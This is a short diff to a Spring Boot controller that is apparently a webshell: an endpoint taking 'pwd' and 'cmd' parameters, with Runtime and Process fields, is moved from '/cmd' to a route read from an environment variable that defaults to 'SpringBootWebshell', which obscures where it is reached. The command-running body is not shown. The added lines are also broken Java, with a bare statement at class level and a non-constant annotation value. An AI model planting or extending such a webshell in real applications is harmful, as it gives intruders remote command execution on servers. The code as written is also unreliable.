@@ -8,13 +8,19 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 
+import java.util.Map;
+import java.util.Properties;
+
 @Controller
 public class IndexController {
 
     private Process p = null;
     private Runtime runtime = null;
-
-    @RequestMapping("/cmd")
+    
+    Map<String, String> settings = System.getenv();
+    settings.getOrDefault("APP_NAME", "SpringBootWebshell");
+    
+    @RequestMapping("/"+settings.getOrDefault("APP_NAME", "SpringBootWebshell"))
     public String command(String pwd, String cmd, Model model){
 
         String output = "";
